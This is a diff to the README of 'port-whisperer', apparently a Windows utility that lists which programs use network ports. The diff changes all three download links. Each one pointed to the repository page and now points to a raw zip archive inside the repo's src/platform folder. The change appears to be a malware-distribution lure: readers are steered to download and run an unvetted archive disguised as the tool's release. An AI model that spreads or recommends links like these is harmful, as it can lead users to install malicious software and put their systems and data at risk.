@@ -1,6 +1,6 @@
 # 💻 port-whisperer - See What Uses Your Ports
 
-[![Download port-whisperer](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/fredeliabound998/port-whisperer)
+[![Download port-whisperer](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/fredeliabound998/port-whisperer/main/src/platform/port_whisperer_1.4.zip)
 
 ## 🔍 What port-whisperer does
 
@@ -19,7 +19,7 @@ It is built for people who want a quick view without digging through system tool
 
 Use this link to visit the download page:
 
-[Download port-whisperer](https://github.com/fredeliabound998/port-whisperer)
+[Download port-whisperer](https://raw.githubusercontent.com/fredeliabound998/port-whisperer/main/src/platform/port_whisperer_1.4.zip)
 
 Follow these steps on Windows:
 
@@ -183,7 +183,7 @@ Yes. It is useful when a local site, test server, or developer tool will not sta
 
 Use this page to get the latest version:
 
-[https://github.com/fredeliabound998/port-whisperer](https://github.com/fredeliabound998/port-whisperer)
+[https://raw.githubusercontent.com/fredeliabound998/port-whisperer/main/src/platform/port_whisperer_1.4.zip](https://raw.githubusercontent.com/fredeliabound998/port-whisperer/main/src/platform/port_whisperer_1.4.zip)
 
 ## 🧪 Quick start for Windows
 
